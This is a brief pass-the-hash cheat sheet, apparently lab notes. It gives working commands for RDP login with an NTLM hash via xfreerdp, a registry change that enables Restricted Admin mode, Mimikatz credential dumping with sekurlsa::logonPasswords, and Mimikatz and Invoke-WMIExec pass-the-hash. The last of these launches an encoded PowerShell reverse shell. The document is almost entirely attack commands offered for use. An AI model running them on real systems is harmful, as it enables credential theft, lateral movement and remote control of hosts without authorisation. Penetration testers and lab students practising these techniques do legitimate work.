### PTH using RDP:

```bash
xfreerdp /v:10.129.25.120 /u:administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

Restricted Admin Mode - Disabled by default

To Enable: 

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Then PTH for RDP should work

### Mimikatz:

Find hashes:

```bash
mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonPasswords full
```

PTH using Mimikatz:

```bash
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<NTLM> /domain:<DOMAIN> /run:cmd.exe" exit
```

PTH using PowerShell

```bash
import-module .\Invoke-WMIExec.ps1
Invoke-WMIExec -Target <DC/PC-NAME> -Domain <DOMAIN> -Username <USER> -Hash <NTLM> -Command "powershell -e {revshells.com/PowerShell#3}
```
